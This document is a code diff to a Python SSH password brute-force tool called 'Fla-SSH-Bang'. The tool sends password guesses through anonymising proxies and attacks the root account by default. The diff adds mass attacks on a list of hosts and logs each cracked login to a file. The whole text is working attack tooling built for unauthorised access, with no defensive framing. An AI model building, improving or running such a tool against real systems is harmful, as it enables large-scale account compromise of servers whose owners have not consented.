@@ -14,7 +14,8 @@ paramiko.util.log_to_file(os.devnull)
 
 class DefaultConfig:
     port = 22
-    threads = 50
+    threads = 16
+    threads_multi_hosts = 10
     username = "root"
 
 class Colors:
@@ -30,13 +31,14 @@ class FlaSSHBang(object):
     active_threads = 0
     kill = False
 
-    def __init__(self, hostname: str, port: int, username: str, passlist: list, proxy_list: list, threads: int):
+    def __init__(self, hostname: str, port: int, username: str, passlist: list, proxy_list: list, threads: int, output_file: str = None):
         self.hostname = hostname
         self.port = port
         self.username = username
         self.passlist = passlist
         self.proxy_list = proxy_list
         self.threads = threads
+        self.output_file = output_file
 
         self.attempt_number = 0
         self.host_ip = None
@@ -86,7 +88,9 @@ class FlaSSHBang(object):
                 
                 except paramiko.ssh_exception.BadAuthenticationType:
                     if self.kill: return
-                    print(f"{Colors.RED}[ ABORT ]{Colors.RESET} This server does not support password authentication! Press <CTRL + C>, now!")
+                    print(f"{Colors.RED}[ ABORT ]{Colors.RESET} {self.hostname}:{self.port} does not support password authentication!")
+                    self.kill = True
+                    return
 
                 except Exception:
                     time.sleep(1)
@@ -97,6 +101,11 @@ class FlaSSHBang(object):
                 
                 print(f"{Colors.GREEN}[SUCCESS]{Colors.RESET} {Colors.PURPLE}111loggedin!{Colors.RESET} {self.hostname}:{self.port} - {self.username}:{password} {Colors.PURPLE}111loggedin!{Colors.RESET}")
                 self.kill = True
+
+                if self.output_file:
+                    with open(self.output_file, "a", errors="replace") as file:
+                        file.write(f"{self.hostname}:{self.port} - {self.username}:{password}\n")
+                        file.close()
                 break
 
         except Exception:
@@ -106,7 +115,7 @@ class FlaSSHBang(object):
             self.active_threads -= 1
     
     def bang_that_aSSH(self):
-        for _ in range(5):
+        for _ in range(3):
             try:
                 self.host_ip = socket.gethostbyname(self.hostname)
                 break
@@ -121,10 +130,10 @@ class FlaSSHBang(object):
 
         port_open = False
 
-        for _ in range(5):
+        for _ in range(3):
             try:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(10)
+                sock.settimeout(5)
                 sock.connect((self.host_ip, self.port))
                 port_open = True
                 break
@@ -155,6 +164,40 @@ class FlaSSHBang(object):
 
             time.sleep(0.05)
 
+class FlaSSHBangMultiHosts(object):
+    active_threads = 0
+
+    def __init__(self, hostnames: list, port: int, username: str, passlist: list, proxy_list: list, threads: int, threads_multi: int, output_file: str = None):
+        self.hostnames = hostnames
+        self.port = port
+        self.username = username
+        self.passlist = passlist
+        self.proxy_list = proxy_list
+        self.threads = threads
+        self.threads_multi = threads_multi
+        self.output_file = output_file
+
+    def create_flasshbang_instance(self, hostname: str):
+        try:
+            self.active_threads += 1
+            flasshbang = FlaSSHBang(hostname=hostname, port=self.port, username=self.username, passlist=self.passlist, proxy_list=self.proxy_list, threads=self.threads, output_file=self.output_file)
+            flasshbang.bang_that_aSSH()
+        except Exception:
+            pass
+        finally:
+            self.active_threads -= 1
+
+    def start(self):
+        for hostname in self.hostnames:
+            while True:
+                if self.active_threads >= self.threads_multi:
+                    time.sleep(0.05)
+                    continue
+
+                break
+
+            threading.Thread(target=self.create_flasshbang_instance, args=[hostname], daemon=True).start()
+
 def clear_console():
     if sys.platform == "win32":
         os.system("cls")
@@ -173,20 +216,38 @@ def main():
     show_banner()
 
     parser = argparse.ArgumentParser(description="Fla-SSH-Bang! Inspired by vanhauser's hydra (also shoutout to him for creating that wonderful tool!). Super fast SSH bruteforce tool powered by proxies that who knows where they came from. Written in Python! Number 1 language in the world!")
-    parser.add_argument("hostname", type=str, help="Target IP address.")
+    parser.add_argument("hostname", type=str, nargs="?", help="Target IP address.")
     parser.add_argument("-p", "--port", type=int, default=DefaultConfig.port, help=f"Target port. Default is set to {DefaultConfig.port}.")
     parser.add_argument("-u", "--username", type=str, default=DefaultConfig.username, help=f"SSH user to attack. The default is set to {DefaultConfig.username}.")
     parser.add_argument("-P", "--passlist", type=argparse.FileType("r"), required=True, help="Your favorite password list from SecLists!")
     parser.add_argument("-pp", "--proxy-list", type=argparse.FileType("r"), required=True, help="Not the size of your penis, but the longer your proxy list is, the better!")
-    parser.add_argument("-t", "--threads", type=int, default=50, help=f"Threads, idk how to explain what threads are. But the default is set to {DefaultConfig.threads}! The more threads, the faster!")
+    parser.add_argument("-t", "--threads", type=int, default=DefaultConfig.threads, help=f"Threads, idk how to explain what threads are. But the default is set to {DefaultConfig.threads}! The more threads, the faster!")
+    parser.add_argument("-T", "--threads-multi", type=int, default=DefaultConfig.threads_multi_hosts, help=f"Threads for multi hosts. The default is {DefaultConfig.threads_multi_hosts}")
+    parser.add_argument("-M", "--host-list", type=argparse.FileType("r"), help="File list of hosts to attack.")
+    parser.add_argument("-o", "--output", type=argparse.FileType("a"), help="Success logins output file.")
 
     args = parser.parse_args()
 
+    if not any([args.hostname, args.host_list]):
+        print(f"{Colors.RED}[ ERROR ]{Colors.RESET} Either a single hostname or host_list is required to start the attack.")
+        return
+
     passlist = args.passlist.read().splitlines()
     proxy_list = args.proxy_list.read().splitlines()
+    output_file = None
 
-    fla_ssh_bang = FlaSSHBang(hostname=args.hostname, port=args.port, username=args.username, passlist=passlist, proxy_list=proxy_list, threads=args.threads)
-    fla_ssh_bang.bang_that_aSSH()
+    if args.output:
+        output_file = args.output.name
+
+    if args.host_list:
+        host_list = args.host_list.read().splitlines()
+        
+        flasshbang_multi = FlaSSHBangMultiHosts(hostnames=host_list, port=args.port, username=args.username, passlist=passlist, proxy_list=proxy_list, threads=args.threads, threads_multi=args.threads_multi, output_file=output_file)
+        flasshbang_multi.start()
+
+    else:
+        flasshbang = FlaSSHBang(hostname=args.hostname, port=args.port, username=args.username, passlist=passlist, proxy_list=proxy_list, threads=args.threads, output_file=output_file)
+        flasshbang.bang_that_aSSH()
 
 if __name__ == "__main__":
     try:
